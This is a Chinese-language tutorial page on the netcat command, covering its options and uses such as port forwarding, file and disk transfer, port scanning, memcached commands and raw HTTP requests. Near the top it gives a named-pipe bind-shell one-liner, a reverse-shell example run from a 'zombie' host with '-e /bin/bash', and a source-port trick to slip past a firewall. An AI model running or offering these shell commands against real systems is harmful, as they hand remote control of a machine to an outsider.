---
title: Linux命令 netcat
date: 2016-01-06T16:46:14+08:00
update: 2016-01-01
categories: [linux_base]
tags: [netcat]
---
# 转发本地端口
`nc -l 8001 -c "nc localhost 8000"` #外网执行 监听本机8001端口，并将流量转发到8000

rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 9999 > /tmp/f

## 反向shell
服务端 nc -l 1567
肉鸡  nc 172.31.100.7 1567 -e /bin/bash

##  10. 指定源端口
假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。
$nc 172.31.100.7 1567 -p 25


功能说明：功能强大的网络工具
语　　法：nc [-hlnruz] [-g<网关...>][-G<指向器数目>][-i<延迟秒数>][-o<输出文件>] [-p<通信端口>][-s<来源位址>][-v...][-w<超时秒数>][主机名称][通信端口...]


想要连接到某处: nc [-options] hostname port[s] [ports]
绑定端口等待连接: nc -l -p port [-options] [hostname] [port]

参数:
-g gateway source-routing hop point[s], up to 8
-G num source-routing pointer: 4, 8, 12, …
-h 帮助信息
-i secs 延时的间隔
-l 监听模式，用于入站连接
-n 指定数字的IP地址，不能用hostname
-o file 记录16进制的传输
-p port 本地端口号
-r 任意指定本地及远程端口
-s addr 本地源地址
-u UDP模式
-v 详细输出——用两个-v可得到更详细的内容
-w secs timeout的时间
-z 将输入输出关掉——用于扫描时，其中端口号可以指定一个或者用lo-hi式的指定范围。

参　　数：
-l   使用监听模式，管控传入的资料。
-v   显示指令执行过程。
-n   直接使用IP地址，而不通过域名服务器。
-u   使用UDP传输协议。
-r   乱数指定本地与远端主机的通信端口。
-z   使用0输入/输出模式，只在扫描通信端口时使用。

-G<指向器数目>   设置来源路由指向器，其数值为4的倍数。
-g<网关>   设置路由器跃程通信网关，最丢哦可设置8个。
-o<输出文件>   指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
-s<来源位址>   设置本地主机送出数据包的IP地址。
-p<通信端口>   设置本地主机使用的通信端口。
-i<延迟秒数>   设置时间间隔，以便传送信息及扫描通信端口。
-w<超时秒数>   设置等待连线的时间。

简单用法举例
在端口1234建立连接，互相发送输入
nc -l 1234
nc 127.0.0.1 1234

nc -p 1234 -w 5 host.example.com 80
建立从本地1234端口到host.example.com的80端口连接，5秒超时
nc -u host.example.com 53
u为UDP连接

echo -n “GET / HTTP/1.0″r”n”r”n” | nc host.example.com 80
连接到主机并执行

nc -v -z host.example.com 70-80
扫描端口(70到80)，可指定范围。-v输出详细信息。

1）端口扫描
# nc -v -w 2 192.168.2.34 -z 21-24
nc: connect to 192.168.2.34 port 21 (tcp) failed: Connection refused
Connection to 192.168.2.34 22 port [tcp/ssh] succeeded!
nc: connect to 192.168.2.34 port 23 (tcp) failed: Connection refused
nc: connect to 192.168.2.34 port 24 (tcp) failed: Connection refused

2) 传输文件
  `nc -l 1234 > test.txt`
  `nc 192.168.2.34 < test.txt`

  `cat rpyc.py |nc -l 1234`
  `nc 10.246.46.15  1234 > rpyc.py `

3)简单聊天工具
在192.168.2.34上： nc -l 1234
在192.168.2.33上： nc 192.168.2.34 1234
这样，双方就可以相互交流了。使用ctrl+C(或D）退出。

3.用nc命令操作memcached
1）存储数据：printf “set key 0 10 6rnresultrn” |nc 192.168.2.34 11211
2）获取数据：printf “get keyrn” |nc 192.168.2.34 11211
3）删除数据：printf “delete keyrn” |nc 192.168.2.34 11211
4）查看状态：printf “statsrn” |nc 192.168.2.34 11211
5）模拟top命令查看状态：watch “echo stats” |nc 192.168.2.34 11211
6）清空缓存：printf “flush_allrn” |nc 192.168.2.34 11211 (小心操作，清空了缓存就没了）


扩展资料二:命令linux nc 命令传输文件

nc到底干嘛用的我不多描述，今天主要讲下用nc传输文件。由于公司的设备sudo后没有ssh，scp等远程接入命令，或host.deny里面设置了 ssh的deny，不管怎样的原因。我今天跨过大家常用的scp,来说明下一个更有用的轻量级工具，nc的另一个强大的功—文件传输。

范例如下：

目的主机监听
nc -l 监听端口  > 要接收的文件名
nc -l 4444 > cache.tar.gz

源主机发起请求
nc  目的主机ip    目的端口
nc  192.168.0.85  4444



server1: 192.168.228.221
server2: 192.168.228.222
二、常见使用
1、远程拷贝文件
remote: `nc -lp 1234 > install.log`
local:  `nc -w 1 192.168.228.222 1234 < install.log`

2、克隆硬盘或分区
操作与上面的拷贝是雷同的，只需要由dd获得硬盘或分区的数据，然后传输即可。
克隆硬盘或分区的操作，不应在已经mount的的系统上进行。所以，需要使用安装光盘引导后，进入拯救模式（或使用Knoppix工 具光盘）启动系统后，在server2上进行类似的监听动作：
# nc -l -p 1234 | dd of=/dev/sda
server1上执行传输，即可完成从server1克隆sda硬盘到server2的任务：
# dd if=/dev/sda | nc 192.168.228.222 1234

3、端口扫描
# nc -v -w 1 192.168.228.222 -z 1-1000
hatest2 [192.168.228.222] 22 (ssh) open

4、保存Web页面
# while true; do nc -l -p 80 -q 1 < somepage.html; done

5、模拟HTTP Headers

[root@hatest1 ~]# `nc www.linuxso.com 80`
GET / HTTP/1.1
Host: ispconfig.org
Referrer: mypage.com
User-Agent: my-browser
在nc命令后，输入红色部分的内容，然后按两次回车，即可从对方获得HTTP Headers内容。

HTTP/1.1 200 OK
Date: Tue, 16 Dec 2008 07:23:24 GMT
Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8
Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/
Expires: 0
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Cache-Control: private, post-check=0, pre-check=0, max-age=0
Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
[......]

6、聊天
nc还可以作为简单的字符下聊天工具使用，同样的，server2上需要启动监听：
`nc -lp 1234`

server1上传输：
` nc 192.168.228.222 1234`

7、传输目录
从server1拷贝nginx-0.6.34目录内容到server2上。需要先在server2上，用nc激活监听，server2上运行：
`nc -l 1234 |tar xzvf -`
`tar czvf – nginx-0.6.34|nc 192.168.228.222 1234`

8、参数简介
这仅是一个1.10版本的简单说明，详细的参数使用还是需要看man：
引用
